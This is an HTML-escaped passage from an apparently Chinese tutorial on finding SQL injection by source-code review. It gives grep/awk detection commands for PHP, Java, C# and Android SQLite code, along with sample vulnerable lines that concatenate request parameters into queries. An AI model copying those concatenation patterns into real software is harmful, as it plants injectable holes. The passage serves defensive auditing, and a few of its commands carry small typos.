&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-i&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;\&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt; =.*&lt;span class=&#34;token entity&#34; title=&#34;\&amp;quot;&#34;&gt;\&#34;&lt;/span&gt;\(SELECT\|UPDATE\|INSERT\|DROP\)&#34;&lt;/span&gt; src/ &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;awk&lt;/span&gt; -F: &lt;span class=&#34;token string&#34;&gt;&#39;{print &#34;filename: &#34;$l&#34;\nline: &#34;$2&#34;\nmatch: &#34;$3&#34;\n\n&#34;}&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#使用sql语句查找，缩小排查&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;理想获得&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;filename: src/SQLi.MySQL.vulnerable.php
line: &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;
match: &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;SELECT * FROM table WHERE field = &#39;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;[&#39;input&#39;]&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这是可以判断存在SQL注入&lt;/p&gt;
&lt;p&gt;另一种情况&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;filename: src/SQLi.MySQL.vulnerable.php
line: &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;
match: &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;SELECT * FROM table WHERE field = &#39;$ input&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;又不能判断$input 是否被污染，跟踪$input&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;\&lt;span class=&#34;token variable&#34;&gt;$input&lt;/span&gt;=.*\$.*&#34;&lt;/span&gt; src/ &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;awk&lt;/span&gt; -F:	&lt;span class=&#34;token string&#34;&gt;&#39;{print &#34;filename: &#34;$l&#34;\nline: &#34;$2&#34;\nmatch: &#34;$3&#34;\n\n&#34;}&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;理想结果&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;filename: src/SQLi.MySQL.vulnerable.php
line: &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;
match: &lt;span class=&#34;token variable&#34;&gt;$input&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;但是还是不能断定存在SQL注入，因为可以存在对$input的过滤&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;\&lt;span class=&#34;token variable&#34;&gt;$input&lt;/span&gt;&#34;&lt;/span&gt; src/ &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;awk&lt;/span&gt; -F: &lt;span class=&#34;token string&#34;&gt;&#39;{print &#34;filename: &#34;$l&#34;\nline: &#34;$2&#34;\nmatch: &#34;$3&#34;\n\n&#34;}&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;得到&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;filename: src/SQLi.MySQL.vulnerable.php
line: &lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;
match: &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;is_string&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;))&lt;/span&gt;	&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
filename: src/SQLi.MySQL.vulnerable.php
line: &lt;span class=&#34;token number&#34;&gt;12&lt;/span&gt;
match: &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;strlen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$maxlength&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
filename: src/SQLi.MySQL.vulnerable.php
line: &lt;span class=&#34;token number&#34;&gt;13&lt;/span&gt;
match: &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ctype_alnum&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;))&lt;/span&gt;	&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;经过对过滤函数的分析，就能判断是否存在SQL注入&lt;/p&gt;
&lt;h5 id=&#34;跟踪Java中的数据&#34;&gt;&lt;a href=&#34;#跟踪Java中的数据&#34; class=&#34;headerlink&#34; title=&#34;跟踪Java中的数据&#34;&gt;&lt;/a&gt;跟踪Java中的数据&lt;/h5&gt;&lt;p&gt;在Java源文件的目录中，寻找是否存在使用了 prepareStatement()、 executeQuery()、executeUpdate()、addBatch()和 executeBatch()的文件&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;preparedStatement(\|executeQuery(\|executeUpdate(\|exe cute(\|addBatch(\|executeBatch(&#34;&lt;/span&gt; src/ &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;awk&lt;/span&gt; -F:	&lt;span class=&#34;token string&#34;&gt;&#39;{print &#34;filename:&#34;$l&#34;\nline: &#34;$2&#34;\nmatch: &#34;$3&#34;\n\n&#34;}&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;获得&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;filename: src/SQLVuln.java
line: &lt;span class=&#34;token number&#34;&gt;89&lt;/span&gt;
match: ResultSet rs &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; statement.executeQuery&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sql&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
filename: src/SQLVuln.java
line: &lt;span class=&#34;token number&#34;&gt;139&lt;/span&gt;
match: statement.executeUpdate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sql&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
filename: src/SQLVuln.java
line: &lt;span class=&#34;token number&#34;&gt;209&lt;/span&gt;
match: ResultSet rs &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; statement.executeQuery&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;
SELECT field FROM table WHERE field = &#34;&lt;/span&gt; +
request.getParameter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;input&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;209行&lt;code&gt;input&lt;/code&gt;是用户直接通过表单提交输入，存在SQL注入&lt;/p&gt;
&lt;p&gt;还需对89,139行的sql进行跟踪判断是否被污染&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; - i &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;sql =.*&lt;span class=&#34;token entity&#34; title=&#34;\&amp;quot;&#34;&gt;\&#34;&lt;/span&gt;\(SELECT\|UPDATE\|INSERT\|DROP\)&#34;&lt;/span&gt; src/ &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;awk&lt;/span&gt; -F: &lt;span class=&#34;token string&#34;&gt;&#39;{print &#34;filename: &#34;$l&#34;\nline: &#34;$2&#34;\nmatch: &#34;$3&#34;\n\n&#34;}&#39;&lt;/span&gt;
filename: src/SQLVuln.java
line: &lt;span class=&#34;token number&#34;&gt;88&lt;/span&gt;
match: String sql &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;SELECT field FROM table WHERE field = &#34;&lt;/span&gt; + request.getParameter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;input&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
filename: src/SQLVuln.java
line: &lt;span class=&#34;token number&#34;&gt;138&lt;/span&gt;
match: String sql &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;INSERT INTO table VALUES field = (&#34;&lt;/span&gt; +
request.getParameter &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;input&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; + &lt;span class=&#34;token string&#34;&gt;&#34;) WHERE field = &#34;&lt;/span&gt; + request. getParameter &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;more-input&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; + &#34;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;和前面一样，也存在SQL注入&lt;/p&gt;
&lt;p&gt;找到渗入源&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;getParameter(\|getParameterValues(\|getQueryString (\|getHeader(\|getHeaders(\|getRequestedSessionld(\|getCookies(\|getValue(&#34;&lt;/span&gt; src/ &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;awk&lt;/span&gt; -F: &lt;span class=&#34;token string&#34;&gt;&#39;{print &#34;filename: &#34;$l&#34;\nline: &#34;$2&#34;\nmatch: &#34;$3&#34;\n\n&#34;}&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;跟踪C-中的数据&#34;&gt;&lt;a href=&#34;#跟踪C-中的数据&#34; class=&#34;headerlink&#34; title=&#34;跟踪C#中的数据&#34;&gt;&lt;/a&gt;跟踪C#中的数据&lt;/h5&gt;&lt;p&gt;在一个C#源文件的目录中，寻找使用了 SqlCommand()、SqlParameter()、OleDbCommand()、OleDbParameter()、OracleCommand()、OracleParameter() 、OdbcCommand()和 OdbcParameter()的位置&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;SqlCommand(\|SqlParameter(\|OleDbCommand(\|OleDbParam eter(\|OracleCommand(\|OracleParameter(\|OdbcCommand(\|OdbcParameter(&#34;&lt;/span&gt; src/ &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;awk&lt;/span&gt; -F: &lt;span class=&#34;token string&#34;&gt;&#39;{print &#34;filename: &#34;$l&#34;\nline: &#34;$2&#34;\nmatch: &#34;$3&#34;\n\n&#34;}&#39;&lt;/span&gt;
filename: src/SQLiMSSQLVuln.cs
line: &lt;span class=&#34;token number&#34;&gt;29&lt;/span&gt;
match: SqlCommand &lt;span class=&#34;token builtin class-name&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; new SqlCommand&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;SELECT ★ FROM table WHERE field = &#39;&#34;&lt;/span&gt; + request.getParameter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;input&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; + &lt;span class=&#34;token string&#34;&gt;&#34;&#39;&#34;&lt;/span&gt;,conn&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
filename: src/SQLiOracleVuln.cs
line: &lt;span class=&#34;token number&#34;&gt;69&lt;/span&gt;
match: OracleCommand &lt;span class=&#34;token builtin class-name&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; new OracleCommand&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sql, conn&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;29行&lt;code&gt;input&lt;/code&gt;是用户直接通过表单提交输入，存在SQL注入&lt;/p&gt;
&lt;p&gt;还需对69行的sql进行跟踪判断是否被污染&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-i&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;sql =.*&lt;span class=&#34;token entity&#34; title=&#34;\&amp;quot;&#34;&gt;\&#34;&lt;/span&gt; \(SELECT\|UPDATE\|INSERT\|DROP\)&#34;&lt;/span&gt; src/ I &lt;span class=&#34;token function&#34;&gt;awk&lt;/span&gt; -F:	&lt;span class=&#34;token string&#34;&gt;&#39;{print &#34;filename: &#34;$l&#34;\nline: &#34;$2&#34;\nmatch: &#34;$3&#34;\n\n&#34;}&#39;&lt;/span&gt;
filename: src/SQLiOracleVuln.cs
line: &lt;span class=&#34;token number&#34;&gt;68&lt;/span&gt;
match: String sql &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;SELECT * FROM table WHERE field = &#39;&#34;&lt;/span&gt; + request.getParameter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;input&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; + &lt;span class=&#34;token string&#34;&gt;&#34;&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;和前面一样，也存在SQL注入&lt;/p&gt;
&lt;p&gt;找到渗入源&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;HttpCookieCollection\|Form\|Headers\|Params\|QuerySt ring\|Servervariables\|Url\|UserAgent\|UserHostAddress\|UserHostName&#34;&lt;/span&gt; src/ &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;awk&lt;/span&gt; -F: &lt;span class=&#34;token string&#34;&gt;&#39;{print &#34;filename: &#34;$l&#34;\nline: &#34;$2&#34;\nmatch: &#34;$3&#34;\n\n&#34;}&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;复查Android应用程序代码&#34;&gt;&lt;a href=&#34;#复查Android应用程序代码&#34; class=&#34;headerlink&#34; title=&#34;复查Android应用程序代码&#34;&gt;&lt;/a&gt;复查Android应用程序代码&lt;/h4&gt;&lt;h5 id=&#34;工具-1&#34;&gt;&lt;a href=&#34;#工具-1&#34; class=&#34;headerlink&#34; title=&#34;工具&#34;&gt;&lt;/a&gt;工具&lt;/h5&gt;&lt;p&gt;&lt;a href=&#34;http://labs.mwrinfosecurity.com/tools/android_webcontentresolver/&#34;&gt;WebContentResolver&lt;/a&gt;，它可以运行在Android设备(或模拟器)上，并向 所有已安装的内容提供程序暴露Web Service接口。&lt;/p&gt;
&lt;p&gt;dex2jar这样的工具可以轻而易举地将Android应用程序的包文件(APK) 转换为Java Archive (JAR)文件。然后，可以采用某种Java反汇编程序 比如jdgui或 jad,反编译应用程序并查看源代码。&lt;/p&gt;
&lt;h5 id=&#34;危险函数&#34;&gt;&lt;a href=&#34;#危险函数&#34; class=&#34;headerlink&#34; title=&#34;危险函数&#34;&gt;&lt;/a&gt;危险函数&lt;/h5&gt;&lt;p&gt;Android开发人员使用两个类与SQLite数据库进行交互：&lt;code&gt;SQLiteQueryBuilder&lt;/code&gt;类和 &lt;code&gt;SQLiteDatabase&lt;/code&gt;类。&lt;code&gt;android.database.sqlite.SQLiteQueryBuilder&lt;/code&gt; 是一个便捷类，用于创建发送给SQLiteDatabase对象的SQL查询&lt;code&gt;android.database.sqlite.SQLiteDatabase&lt;/code&gt; 类 则提供了用于管理 SQLite 数据库的各种方法。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-java&#34; data-language=&#34;java&#34;&gt;&lt;code class=&#34;language-java&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;//android.database.sqlite.SQLiteQueryBuilder&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//构造一条SELECT语句，该语句适合作为buildUnionQuery中通过UNION操作符连接的语句组中的SELECT语句&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;buildQuery&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; projectionIn&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; selection&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; groupBy&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; having&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; sortOrder&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; limit&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//用指定的子句构造一个SQL查询字符串&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;buildQueryString&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;boolean&lt;/span&gt; distinct&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; tables&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;columns&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt; String&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;where&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt; String&lt;/span&gt; groupBy&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; having&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; orderBy&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; limit&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; 
&lt;span class=&#34;token comment&#34;&gt;//给定一组子查询，其中每一个都是SELECT语句，构造一个union所有这些子查询返回结果的查询 &lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;buildUnionQuery&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; subQueries&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; sortOrder&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; limit&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//构造一条SELECT语句，该语句适合作为buildUnionQuery中通过UNION操作符连接的语句组中的SELECT语句&lt;/span&gt;
